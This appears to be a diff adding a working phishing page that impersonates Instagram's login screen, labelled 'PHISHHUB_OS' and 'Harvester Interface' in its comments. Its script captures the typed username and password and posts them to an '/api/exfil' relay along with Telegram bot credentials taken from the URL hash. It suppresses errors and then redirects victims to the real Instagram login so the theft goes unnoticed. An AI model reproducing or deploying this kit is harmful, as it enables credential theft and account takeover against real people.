@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { 
+            background-color: #ffffff; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            margin: 0; 
+            padding: 0; 
+            color: #000000;
+            overflow: hidden;
+        }
+        
+        .splash-screen { 
+            position: fixed; 
+            inset: 0; 
+            background: white; 
+            z-index: 100; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            transition: opacity 0.5s cubic-bezier(0.4, 0, 0.2, 1); 
+        }
+        
+        .ig-input {
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 12px;
+            font-size: 14px;
+            height: 52px;
+            padding: 0 16px;
+            width: 100%;
+            margin-bottom: 12px;
+            transition: all 0.2s;
+        }
+
+        .ig-input:focus {
+            border-color: #a8a8a8;
+            outline: none;
+            background: #fff;
+        }
+
+        .btn-primary {
+            background-color: #0064e0;
+            border-radius: 9999px;
+            color: #fff;
+            font-weight: 600;
+            height: 44px;
+            width: 100%;
+            cursor: pointer;
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 4px;
+            transition: opacity 0.2s;
+        }
+        .btn-primary:active { opacity: 0.8; }
+
+        .btn-outline {
+            border: 1px solid #dbdbdb;
+            color: #000;
+            border-radius: 9999px;
+            font-weight: 600;
+            height: 44px;
+            width: 100%;
+            cursor: pointer;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: transparent;
+        }
+
+        .fade-hide { opacity: 0; pointer-events: none; }
+        .main-wrapper { opacity: 0; transition: opacity 0.6s ease-in; transform: translateY(10px); transition: all 0.6s cubic-bezier(0.2, 0.8, 0.2, 1); }
+        .fade-show { opacity: 1; transform: translateY(0); }
+        
+        .loader-ring {
+            border: 3px solid rgba(0, 100, 224, 0.1);
+            border-top: 3px solid #0064e0;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen">
+
+    <!-- Stage 1: Native Splash Sequence -->
+    <div id="splash" class="splash-screen">
+        <img src="https://static.cdninstagram.com/rsrc.php/y4/r/xOP_FkbMZmy.webp" alt="IG" class="w-20 h-20 mb-4 animate-pulse">
+        <div class="absolute bottom-12 flex flex-col items-center gap-2">
+            <span class="text-[10px] text-gray-400 uppercase tracking-widest font-bold">from</span>
+            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yA/r/H5KMJlh-MJS.webp" alt="Meta" class="h-4">
+        </div>
+    </div>
+
+    <!-- Stage 2: Harvester Interface -->
+    <div class="main-wrapper text-center py-5 text-[#737373] text-[13px]">
+        English (US)
+    </div>
+
+    <div id="main-content" class="main-wrapper flex-grow flex flex-col items-center justify-center px-6 -mt-10">
+        <div class="w-full max-w-[360px] flex flex-col items-center">
+            <div class="mb-14">
+                <img src="https://static.cdninstagram.com/rsrc.php/y4/r/xOP_FkbMZmy.webp" alt="Instagram" class="w-20 h-20">
+            </div>
+
+            <div class="w-full mb-4">
+                <input type="text" id="username" placeholder="Username, email or mobile number" class="ig-input" spellcheck="false">
+                <input type="password" id="password" placeholder="Password" class="ig-input">
+                <button id="login-btn" onclick="executeExfil()" class="btn-primary">
+                    <span id="btn-text">Log in</span>
+                    <div id="btn-loader" class="loader-ring hidden"></div>
+                </button>
+            </div>
+
+            <div class="text-center pt-2">
+                <a href="#" class="text-[#000000] text-sm font-semibold tracking-tight">Forgot password?</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Persistent Bottom UI -->
+    <div id="footer-actions" class="main-wrapper pb-10 px-6 w-full max-w-[360px] mx-auto space-y-4">
+        <button class="btn-outline">
+            Create new account
+        </button>
+        <div class="flex flex-col items-center gap-1 opacity-60">
+             <span class="text-[9px] uppercase font-bold text-gray-400">Meta</span>
+             <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yA/r/H5KMJlh-MJS.webp" alt="Meta" class="h-3">
+        </div>
+    </div>
+
+    <script>
+        // PHISHHUB_OS: Dynamic Config Extraction
+        const getExfilParams = () => {
+            const h = window.location.hash.substring(1);
+            if (!h) return null;
+            try { return JSON.parse(atob(h)); } catch(e) { return null; }
+        };
+
+        const config = getExfilParams();
+
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                document.getElementById('splash').classList.add('fade-hide');
+                document.querySelectorAll('.main-wrapper').forEach(el => el.classList.add('fade-show'));
+                document.body.style.overflow = 'auto';
+            }, 1800);
+        });
+
+        async function executeExfil() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            const btnText = document.getElementById('btn-text');
+            const btnLoader = document.getElementById('btn-loader');
+
+            if (!user || !pass) return;
+
+            // UI Feedback
+            btnText.classList.add('hidden');
+            btnLoader.classList.remove('hidden');
+
+            const redirectUrl = "https://www.instagram.com/accounts/login/";
+
+            if (!config) {
+                setTimeout(() => window.location.href = redirectUrl, 1000);
+                return;
+            }
+
+            try {
+                // Routing through PHISHHUB_OS relay
+                await fetch('/api/exfil', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        target: 'instagram',
+                        credentials: { username: user, password: pass },
+                        tgToken: config.t,
+                        tgChat: config.c
+                    })
+                });
+            } catch (e) {
+                // Suppress errors
+            } finally {
+                setTimeout(() => {
+                    window.location.href = redirectUrl;
+                }, 1000);
+            }
+        }
+    </script>
+</body>
+</html>
